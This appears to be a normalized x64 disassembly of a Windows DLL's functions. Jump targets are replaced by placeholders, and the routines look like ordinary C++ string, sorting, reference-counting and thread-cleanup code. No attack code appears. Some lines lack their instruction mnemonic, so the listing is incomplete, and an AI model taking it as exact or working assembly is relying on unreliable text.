sub_180001010
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001c40c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_180001100
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_180001130
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x7fffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
lea rcx [ rdx + rdx ]
call sub_18001c84c
test rax rax
jne r-xdata
sub_1800011a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rbp [ rcx + 0x8 ]
mov rdi r8
mov rsi rdx
mov rbx rcx
test rbp rbp
je r-xdata
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
jmp r-xdata
[ rbp + 0x8 ]
mov [ rsp + 0x30 ] r12
jne r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r8
mov [ rcx ] rdx
jmp r-xdata
mov rax [ rbp ]
mov rcx rbp
call [ rax ]
[ rbp + 0xc ]
jne r-xdata
mov r12 [ rsp + 0x30 ]
mov [ rbx + 0x8 ] rdi
mov [ rbx ] rsi
mov rax [ rbp ]
mov rcx rbp
call [ rax + 0x8 ]
sub_180001220
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
add rcx 0x18
call sub_1800031a0
lea rcx [ rdi + rdi * 4 ]
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
lea rax [ rax + rcx * 8 ]
mov [ rbx + 0x10 ] rax
mov al 0x1
lea rcx [ r--data ]
call sub_18001c17c
sub_180001290
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x8
jb r-xdata
mov rdx rcx
mov rdx [ rcx ]
jmp r-xdata
lea rax [ r9 + rdi ]
sub r8 rdi
lea rcx [ rcx + r9 * 2 ]
lea rdx [ rdx + rax * 2 ]
add r8 r8
call sub_18001c4a0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] r11
jb r-xdata
mov rcx [ rcx ]
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + r11 * 2 ] cx
sub_180001330
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r13 r8
mov rbx rcx
mov rdi rdx
or rdi 0x7
mov r9 0x7ffffffffffffffe
cmp rdi r9
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor r12d r12d
mov esi r12d
test rcx rcx
je r-xdata
mov rax r9
sub rax rcx
cmp r8 rax
lea rdi [ rcx + r8 ]
jbe r-xdata
jmp r-xdata
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
mov rdi r9
test r13 r13
je r-xdata
mov [ rsp + 0x88 ] r12
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_18001c398
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_18001c8f0
nop
add rcx rcx
call sub_18001c84c
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r13
cmp rdi 0x8
cmovae rbx rsi
mov [ rbx + r13 * 2 ] r12w
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_18001c80c
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea r8 [ r13 + r13 ]
mov rcx rsi
call sub_18001c4a0
sub_180001480
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_18001c84c
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_1800011a0
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_1800014f0
push rbp
push rdi
push r12
push r14
sub rsp 0x28
mov r12 rdx
mov r14 r8
mov rdi rcx
sub r12 rcx
sar r12 0x3
mov rax r12
cqo
sub rax rdx
sar rax 0x1
mov rbp rax
test rax rax
jle r-xdata
add rsp 0x28
pop r14
pop r12
pop rdi
pop rbp
retn
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] r13
mov [ rsp + 0x20 ] r15
lea r15 [ rax + rax + 0x2 ]
nop [ rax + rax ] eax
cmp rbx r12
jne r-xdata
nop [ rax + rax ] ax
lea rax [ rsi - 0x1 ]
cqo
sub rax rdx
sar rax 0x1
mov rbx rax
cmp rbp rsi
jge r-xdata
mov rax [ rdi + r12 * 8 - 0x8 ]
mov [ rdi + rsi * 8 ] rax
lea rsi [ r12 - 0x1 ]
mov rax [ rdi + rbx * 8 ]
mov [ rdi + rsi * 8 ] rax
mov rsi rbx
lea rbx [ rbx + rbx + 0x2 ]
cmp rbx r12
jl r-xdata
dec rbx
mov [ rdi + rsi * 8 ] r13
test rbp rbp
jg r-xdata
nop
mov rdx [ rdi + rbx * 8 - 0x8 ]
mov rcx [ rdi + rbx * 8 ]
call r14
test al al
je r-xdata
mov r13 [ rdi + rbp * 8 - 0x8 ]
dec rbp
sub r15 0x2
mov rsi rbp
mov rbx r15
cmp r15 r12
jge r-xdata
mov r15 [ rsp + 0x20 ]
mov r13 [ rsp + 0x60 ]
mov rsi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
mov rcx [ rdi + rbx * 8 ]
lea rax [ rbx - 0x1 ]
cqo
mov [ rdi + rsi * 8 ] rcx
mov rsi rbx
sub rax rdx
sar rax 0x1
mov rbx rax
cmp rbp rsi
jl r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rdx r13
call r14
test al al
je r-xdata
sub_180001610
cmp rcx rdx
je r-xdata
retn
push r12
push r13
push r14
sub rsp 0x20
mov [ rsp + 0x58 ] rdi
lea rdi [ rcx + 0x8 ]
mov r12 r8
mov r13 rdx
mov r14 rcx
cmp rdi rdx
je r-xdata
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
nop [ rax ] eax
mov rdx [ rdi - 0x8 ]
lea rbx [ rdi - 0x8 ]
mov rcx rsi
call r12
test al al
je r-xdata
mov rax rdi
mov rcx rdi
mov rdx r14
sub rax r14
sar rax 0x3
lea r8 [ rax * 8 ]
sub rcx r8
add rcx 0x8
call sub_18001c4a0
mov [ r14 ] rsi
jmp r-xdata
mov [ rbp ] rsi
nop
add rdi 0x8
cmp rdi r13
jne r-xdata
mov rsi [ rdi ]
mov rdx [ r14 ]
mov rbp rdi
mov rcx rsi
call r12
test al al
je r-xdata
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rax [ rbx ]
mov rcx rsi
mov [ rbp ] rax
mov rdx [ rbx - 0x8 ]
mov rbp rbx
sub rbx 0x8
call r12
test al al
jne r-xdata
sub_1800016f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx ]
mov rdi rcx
mov rcx [ rbx ]
mov rbp r9
mov rsi r8
call rbp
test al al
je r-xdata
mov rdx [ rbx ]
mov rcx [ rsi ]
call rbp
test al al
je r-xdata
mov rax [ rdi ]
mov r10 [ rbx ]
mov [ rbx ] rax
mov [ rdi ] r10
mov rdx [ rdi ]
mov rcx [ rbx ]
call rbp
test al al
je r-xdata
mov rax [ rbx ]
mov rcx [ rsi ]
mov [ rsi ] rax
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov rcx [ rbx ]
mov [ rbx ] rax
mov [ rdi ] rcx
sub_180001770
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rax [ rcx ]
mov r12 [ rdx - 0x8 ]
mov rbp rdx
sub rbp rcx
mov ebx 0x2
xor esi esi
sub rbp 0x8
mov r13 r8
mov rdi rcx
sar rbp 0x3
mov [ rdx - 0x8 ] rax
cmp rbx rbp
jge r-xdata
jne r-xdata
mov rdx [ rdi + rbx * 8 - 0x8 ]
mov rcx [ rdi + rbx * 8 ]
call r13
test al al
je r-xdata
lea rax [ rsi - 0x1 ]
cqo
sub rax rdx
sar rax 0x1
mov rbx rax
test rsi rsi
jle r-xdata
mov rax [ rdi + rbp * 8 - 0x8 ]
mov [ rdi + rsi * 8 ] rax
lea rsi [ rbp - 0x1 ]
mov rax [ rdi + rbx * 8 ]
mov [ rdi + rsi * 8 ] rax
mov rsi rbx
lea rbx [ rbx + rbx + 0x2 ]
cmp rbx rbp
jl r-xdata
dec rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov [ rdi + rsi * 8 ] r12
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
nop
mov rcx [ rdi + rbx * 8 ]
lea rax [ rbx - 0x1 ]
cqo
mov [ rdi + rsi * 8 ] rcx
mov rsi rbx
sub rax rdx
sar rax 0x1
mov rbx rax
test rsi rsi
jg r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rdx r12
call r13
test al al
je r-xdata
sub_180001850
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_18001c80c
sub_180001880
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rax 0x7ffffffffffffffe
mov rdi rdx
mov rbx rcx
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rsi
xor esi esi
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
test r8b r8b
je r-xdata
mov r8 [ rcx + 0x10 ]
call sub_180001330
jmp r-xdata
test rdx rdx
jne r-xdata
cmp rdx 0x8
jae r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x48 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rsi
cmp rax 0x8
jb r-xdata
mov [ rsp + 0x30 ] rbp
mov rbp [ rcx + 0x10 ]
cmp rdx rbp
cmovb rbp rdx
cmp rax 0x8
jb r-xdata
mov [ rbx ] si
mov rbx [ rcx ]
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] 0x7
mov [ rbx + rbp * 2 ] si
mov rbp [ rsp + 0x30 ]
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov r12 [ rcx ]
test rbp rbp
je r-xdata
mov rcx r12
call j_sub_18001c80c
mov r12 [ rsp + 0x40 ]
lea r8 [ rbp + rbp ]
mov rdx r12
call sub_18001c4a0
sub_180001960
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x40
xor edi edi
mov rbx rcx
mov [ rcx ] rdi
lea ecx [ rdi + 0x10 ]
call sub_18001c84c
test rax rax
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] rdi
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
mov [ rbx ] rax
mov [ rax ] rdi
mov [ rax + 0x8 ] rdi
mov rax [ rbx ]
mov [ rax ] rbx
mov [ rbx + 0x8 ] rdi
mov [ rbx + 0x10 ] rdi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x20 ] rdi
mov rax rbx
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
sub_1800019e0
push r12
push r13
push r14
sub rsp 0x20
mov rax r8
mov r13 r9
mov r12 r8
sub rax rcx
mov r14 rdx
sar rax 0x3
cmp rax 0x28
jle r-xdata
add rsp 0x20
pop r14
pop r13
pop r12
jmp sub_1800016f0
inc rax
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
cqo
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
and edx 0x7
add rax rdx
sar rax 0x3
mov rsi rax
lea rdi [ rax * 8 ]
shl rsi 0x4
lea rbp [ rdi + rcx ]
lea r8 [ rsi + rcx ]
mov rdx rbp
call sub_1800016f0
mov rcx r14
lea r8 [ rdi + r14 ]
sub rcx rdi
mov r9 r13
mov rdx r14
call sub_1800016f0
mov rbx r12
mov rcx r12
sub rbx rdi
mov r9 r13
mov r8 r12
mov rdx rbx
sub rcx rsi
call sub_1800016f0
mov r9 r13
mov r8 rbx
mov rdx r14
mov rcx rbp
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
jmp sub_1800016f0
sub_180001ac0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_180001290
mov r8 r12
xor edx edx
mov rcx rbx
call sub_180001290
jmp r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180001330
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsi ]
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rbp [ rdi + rdi ]
lea rdx [ rsi + r12 * 2 ]
mov r8 rbp
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rbp ] ax
mov rbp [ rsp + 0x30 ]
sub_180001bf0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r15 rdx
mov rax r8
mov r14 r8
sub rax rdx
add r8 0xfffffffffffffff8
mov rcx r15
sar rax 0x3
mov r13 r9
cqo
sub rax rdx
sar rax 0x1
lea rbx [ r15 + rax * 8 ]
mov rdx rbx
call sub_1800019e0
lea rsi [ rbx + 0x8 ]
cmp r15 rbx
jae r-xdata
cmp rsi r14
jae r-xdata
nop [ rax + rax ] eax
mov rdi rsi
mov r12 rbx
nop [ rax ] eax
nop [ rax ] eax
mov rdx [ rdi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
cmp r12 r15
jbe r-xdata
mov rdx [ rdi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rdx [ rsi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rbx rdi
cmp r15 rdi
jb r-xdata
jne r-xdata
mov rcx [ r12 - 0x8 ]
mov rdx [ rbx ]
lea rbp [ r12 - 0x8 ]
call r13
test al al
jne r-xdata
add rdi 0x8
cmp rdi r14
jb r-xdata
mov rdx [ rbx ]
mov rcx [ rdi ]
call r13
test al al
jne r-xdata
add rsi 0x8
cmp rsi r14
jb r-xdata
mov rcx [ rbx - 0x8 ]
mov rdx [ rbx ]
lea rdi [ rbx - 0x8 ]
call r13
test al al
jne r-xdata
sub r12 0x8
cmp rdi r14
jne r-xdata
cmp rdi r14
je r-xdata
mov r12 rbp
cmp r15 rbp
jb r-xdata
mov rdx [ rbp ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rax [ rdi ]
mov rdx rsi
add rsi 0x8
mov rcx [ rdx ]
mov [ rdx ] rax
mov [ rdi ] rcx
mov rdx [ rbx ]
mov rcx [ rsi ]
call r13
test al al
jne r-xdata
mov rcx [ rdi ]
mov rax [ r12 ]
add rdi 0x8
mov [ rdi - 0x8 ] rax
mov [ r12 ] rcx
jmp r-xdata
sub rbx 0x8
cmp r12 rbx
je r-xdata
mov rax [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
mov [ rax ] rbx
mov rbx [ rsp + 0x58 ]
mov [ rax + 0x8 ] rsi
mov rsi [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp rsi rdi
je r-xdata
cmp r12 r15
mov rax [ rbp ]
mov rcx [ rbx - 0x8 ]
sub rbx 0x8
mov [ rbx ] rax
mov [ rbp ] rcx
cmp rdi r14
jae r-xdata
mov rax [ rsi - 0x8 ]
mov rcx [ rbx ]
sub rsi 0x8
mov [ rbx ] rax
mov [ rsi ] rcx
jmp r-xdata
mov rax [ rbx ]
mov rcx [ r12 ]
mov [ r12 ] rax
mov [ rbx ] rcx
mov r8 rdi
mov rdx rbx
add rsi 0x8
mov rax [ r8 ]
mov rcx [ rdx ]
add rbx 0x8
mov [ rdx ] rax
mov [ r8 ] rcx
add rdi 0x8
jmp r-xdata
mov rax [ rsi ]
mov rcx [ rbx ]
mov [ rbx ] rax
mov [ rsi ] rcx
sub_180001df0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rax rdx
mov rbp r8
mov rbx rdx
sub rax rcx
mov rsi rcx
and rax 0xfffffffffffffff8
cmp rax 0x8
jle r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
mov rdi rcx
neg rdi
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rsi
call sub_180001770
sub rbx 0x8
lea rax [ rdi + rbx ]
and rax 0xfffffffffffffff8
cmp rax 0x8
jg r-xdata
mov rdi [ rsp + 0x30 ]
sub_180001e60
mov rax rsp
push r13
push r14
push r15
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov r13 rcx
xor r15d r15d
nop
mov ecx 0x1f4
call [ Sleep@IAT ]
mov rcx [ r13 + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
test al al
je r-xdata
mov rcx [ r13 + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
test al al
je r-xdata
xor r12b r12b
mov rcx [ r13 + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x40 ] r15
mov rdx rax
lea rcx [ rsp + 0x38 ]
call sub_180001480
nop
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov ecx 0x1f4
call [ Sleep@IAT ]
inc r12b
jmp r-xdata
mov rcx [ r13 + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x30 ] r15
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_180001480
nop
mov rsi [ rsp + 0x28 ]
mov rbx [ rsp + 0x30 ]
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
lea r12 [ rsp + 0x58 ]
mov [ rsp + 0x58 ] r15
mov [ rsp + 0x60 ] r15
test rbx rbx
je r-xdata
cmp r12b 0x5
jae r-xdata
test rbx rbx
je r-xdata
lea r14 [ rsp + 0x48 ]
mov [ rsp + 0x48 ] r15
mov [ rsp + 0x50 ] r15
test rbx rbx
je r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ r13 + 0x30 ]
mov rax [ rcx ]
mov rdx r12
call [ rax + 0x8 ]
nop
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ r13 + 0x30 ]
mov rax [ rcx ]
mov rdx r14
call [ rax + 0x8 ]
nop
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x40 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
jne r-xdata
mov rcx [ rsp + 0x40 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
mov rdi [ r12 + 0x8 ]
test rdi rdi
je r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rdi [ r14 + 0x8 ]
test rdi rdi
je r-xdata
mov [ r12 + 0x8 ] rbx
mov [ r12 ] rsi
[ rdi + 0x8 ]
jne r-xdata
mov [ r14 + 0x8 ] rbx
mov [ r14 ] rsi
[ rdi + 0x8 ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_1800020a0
push rbx
sub rsp 0x20
xor eax eax
mov [ rcx + 0x18 ] 0x7
or r9 0xffffffffffffffff
mov [ rcx + 0x10 ] rax
xor r8d r8d
mov rbx rcx
mov [ rcx ] ax
call sub_180001ac0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800020d0
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x40
lea rax [ r--data ]
mov rsi rcx
mov [ rsp + 0x50 ] rbx
mov [ rcx ] rax
mov rcx [ rcx + 0x70 ]
mov [ rsp + 0x60 ] rdi
test rcx rcx
je r-xdata
mov rcx [ rsi + 0x68 ]
test rcx rcx
je r-xdata
xor edx edx
call [ TerminateThread@IAT ]
mov rcx [ rsi + 0x70 ]
call [ CloseHandle@IAT ]
mov rax [ rsi + 0x18 ]
cmp [ rsi + 0x10 ] rax
je r-xdata
xor edx edx
call [ TerminateThread@IAT ]
mov rcx [ rsi + 0x68 ]
call [ CloseHandle@IAT ]
xor r12d r12d
mov edi r12d
cmp [ rsi + 0x58 ] r12
jbe r-xdata
mov rbx [ rsi + 0x10 ]
mov rdx rax
cmp rbx rax
je r-xdata
mov rax [ rsi + 0x58 ]
mov rdi [ rsp + 0x60 ]
test rax rax
je r-xdata
mov [ rsp + 0x58 ] rbp
nop [ rax + rax ] ax
sub rax rax
mov rcx rbx
sar rax 0x3
lea rdi [ rax * 8 ]
mov r8 rdi
call sub_18001c4a0
lea r11 [ rdi + rbx ]
mov [ rsi + 0x18 ] r11
mov rbx [ rsi + 0x48 ]
test rbx rbx
je r-xdata
test rax rax
je r-xdata
mov rax [ rax ]
mov rax r12
jmp r-xdata
mov rcx [ rsi + 0x40 ]
mov rbx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
nop [ rax + rax ] ax
cmp [ rsi + 0x58 ] r12
jne r-xdata
dec rax
mov [ rsi + 0x58 ] rax
jne r-xdata
mov rax [ rax + 0x8 ]
mov rdx [ rsi + 0x58 ]
mov rcx [ rax + rcx * 8 ]
mov rbx [ rcx + rbx * 8 ]
test rdx rdx
je r-xdata
sub rcx rdx
mov rbx [ r11 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx rbx
and ebx 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rcx [ rsi + 0x38 ]
mov [ rsi + 0x48 ] r12
mov [ rsi + 0x40 ] r12
call j_sub_18001c80c
mov [ rsi + 0x38 ] r12
mov rcx [ rsi + 0x10 ]
test rcx rcx
je r-xdata
call j_sub_18001c80c
test rbx rbx
jne r-xdata
mov rcx [ rcx + rbx * 8 ]
call j_sub_18001c80c
mov [ rsi + 0x50 ] r12
test rbx rbx
je r-xdata
inc [ rsi + 0x50 ]
mov rcx [ rsi + 0x50 ]
mov rax [ rsi + 0x48 ]
add rax rax
cmp rax rcx
lea rax [ rdx - 0x1 ]
cmovbe rcx r12
mov [ rsi + 0x58 ] rax
mov [ rsi + 0x50 ] rcx
test rax rax
jne r-xdata
mov [ rsi + 0x10 ] r12
mov [ rsi + 0x18 ] r12
mov [ rsi + 0x20 ] r12
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
call j_sub_18001c80c
mov rcx [ rsi + 0x40 ]
dec rbx
cmp [ rcx + rbx * 8 ] r12
je r-xdata
inc rdi
cmp rdi [ rsi + 0x58 ]
jb r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov [ rsi + 0x50 ] r12
lea rdx [ rsp + 0x20 ]
lea rcx [ rsi + 0x38 ]
call sub_180010710
mov r11 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rbp [ rsp + 0x58 ]
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_1800022f0
push rdi
sub rsp 0x40
xor edi edi
cmp [ rcx + 0x58 ] rdi
je r-xdata
mov rax rdi
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x50 ] rbx
lea rbx [ rcx + 0x38 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_180010710
mov r8 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax ]
mov eax edi
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdx [ rcx + r8 * 8 ]
mov r8 [ rbx + 0x20 ]
test r8 r8
je r-xdata
sub rcx rdx
mov r8 [ r8 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx r8
and r8d 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rax rdx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
inc [ rbx + 0x18 ]
mov rcx [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rax rax
cmp rax rcx
